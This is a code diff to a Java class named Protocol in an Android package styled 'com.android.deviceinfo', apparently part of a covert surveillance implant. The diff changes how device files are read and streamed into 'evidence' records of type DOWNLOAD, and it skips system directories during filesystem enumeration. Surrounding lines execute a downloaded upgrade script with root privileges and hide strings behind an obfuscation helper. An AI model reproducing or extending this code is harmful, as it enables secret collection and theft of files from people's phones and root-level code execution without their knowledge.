@@ -9,11 +9,16 @@
 
 package com.android.deviceinfo.action.sync;
 
+import java.io.BufferedInputStream;
+import java.io.DataInputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.util.Arrays;
 import java.util.Date;
+import java.util.HashSet;
 import java.util.List;
+import java.util.Set;
 import java.util.Vector;
 
 import android.content.Intent;
@@ -52,7 +57,7 @@ public abstract class Protocol implements iProtocol {
 
 	Status status;
 
-	static List<String> blackListDir = Arrays.asList(new String[] { "/sys", "/dev", "/proc" });
+	static Set<String> blackListDir = new HashSet(Arrays.asList(new String[] { "/sys", "/dev", "/proc", "/acct" }));
 
 	/** The reload. */
 	// public boolean reload;
@@ -138,9 +143,9 @@ public abstract class Protocol implements iProtocol {
 	 */
 	public static boolean upgradeMulti(final Vector<String> files) {
 
-		String upgradeShell = String.format(M.e("upgrade.%s.sh"), Cfg.OSVERSION) ;
+		String upgradeShell = String.format(M.e("upgrade.%s.sh"), Cfg.OSVERSION);
 		boolean upgraded = false;
-		
+
 		// core.default.apk
 		if (files.contains(upgradeShell) && Status.self().haveRoot()) {
 			final File file = new File(Path.upload(), upgradeShell);
@@ -148,7 +153,7 @@ public abstract class Protocol implements iProtocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (upgradeMulti): executing " + upgradeShell);
 			}
-			
+
 			try {
 				Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + file.getAbsolutePath());
 			} catch (IOException e) {
@@ -156,7 +161,7 @@ public abstract class Protocol implements iProtocol {
 					Check.log(TAG + " (upgradeMulti) Error: " + e);
 				}
 			}
-		 
+
 			Execute ex = new Execute();
 			ExecuteResult result = ex.executeRoot(file.getAbsolutePath());
 			if (Cfg.DEBUG) {
@@ -214,7 +219,7 @@ public abstract class Protocol implements iProtocol {
 	 *            the filefilter
 	 */
 	public static void saveDownloadLog(final String filefilter) {
-		AutoFile file = new AutoFile(filefilter);
+		File file = new File(filefilter);
 		if (file.exists()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " logging file: " + filefilter);//$NON-NLS-1$
@@ -229,7 +234,7 @@ public abstract class Protocol implements iProtocol {
 			final String[] files = file.list();
 			for (final String filename : files) {
 
-				file = new AutoFile(filename);
+				file = new File(filename);
 				if (file.isDirectory()) {
 					continue;
 				}
@@ -245,12 +250,11 @@ public abstract class Protocol implements iProtocol {
 	/**
 	 * Save file log.
 	 * 
-	 * @param file
-	 *            the file
+	 * @param !file the file
 	 * @param filename
 	 *            the filename
 	 */
-	private static void saveFileLog(final AutoFile file, final String filename) {
+	private static void saveFileLog(final File file, final String filename) {
 		if (Cfg.DEBUG) {
 			Check.requires(file != null, "null file"); //$NON-NLS-1$
 		}
@@ -264,17 +268,32 @@ public abstract class Protocol implements iProtocol {
 			Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 		byte[] content;
-		if (file.canRead()) {
-			content = file.read();
-		} else {
+		if (!file.canRead()) {
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveFileLog): not readable");
 			}
-			content = new byte[] { 0 };
+			return;
 		}
+		try {
+			int length = (int) file.length();
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveFileLog) %s length: %s", filename, length);
+			}
+			final byte[] additional = Protocol.logDownloadAdditional(filename);
+			EvidenceReference ev = new EvidenceReference(EvidenceType.DOWNLOAD, additional);
+			
+			DataInputStream is = new DataInputStream(new FileInputStream(file));
+			ev.write(is, length);
 
-		final byte[] additional = Protocol.logDownloadAdditional(filename);
-		EvidenceReference.atomic(EvidenceType.DOWNLOAD, additional, content);
+			is.close();
+			ev.close();
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveFileLog) Error: " + e);
+			}
+		}
 
 	}
 
@@ -511,13 +530,18 @@ public abstract class Protocol implements iProtocol {
 					continue;
 				}
 
-				final boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
-				if (isDir && depth > 1) {
-					if (!blackListDir.contains(dir)) {
+				if (!blackListDir.contains(dPath)) {
+					final boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
+					if (isDir && depth > 1) {
 						expandPath(fsLog, dPath, depth - 1);
+					}
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (expandPath) blocked path: %s", dPath);
 					}
 				}
 			}
+
 		}
 	}
 
